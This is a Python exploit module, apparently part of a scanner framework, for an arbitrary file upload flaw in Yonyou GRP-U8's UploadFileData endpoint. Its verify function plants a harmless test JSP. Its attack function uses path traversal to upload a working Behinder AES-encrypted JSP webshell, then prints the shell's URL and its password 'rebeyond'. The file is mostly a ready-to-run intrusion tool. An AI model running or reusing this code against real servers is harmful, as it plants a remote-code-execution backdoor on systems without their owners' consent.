import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': '用友GRP-U8 UploadFileData任意文件上传(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://mp.weixin.qq.com/s/AkaQ6VtbSKPxmHTpCjVqgw',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = 'testing.jsp'
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={0}&filename=1.jpg'.format(filename)
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundary92pUawKc\r\n\r\nContent-Disposition: form-data; name="myFile";filename="test.jpg"\r\n\r\n{0}\r\n------WebKitFormBoundary92pUawKc--'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/R9iPortal/' + filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and 'parent.showSucceedMsg()' in rep.text:
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
        return result
    except:
        return result

def attack(url):
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 4)) + '.jsp'
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    payload = '/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={0}&filename=1.jpg'.format(filename)
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundary92pUawKc\r\n\r\nContent-Disposition: form-data; name="myFile";filename="test.jpg"\r\n\r\n{0}\r\n------WebKitFormBoundary92pUawKc--'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/R9iPortal/' + filename)
    print('[+] exploit loading ......')
    time.sleep(2)
    try:
        print('[+] 开始上传webshell')
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and 'parent.showSucceedMsg()' in rep.text:
            print('[+] 上传成功,检测webshell是否存在?')
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print('[*] status_code: 200 , 上传成功!')
                print('[*] webshell(冰蝎):', verify_url)
                print('[*] 密码: rebeyond')
                return True
        return False
    except:
        return False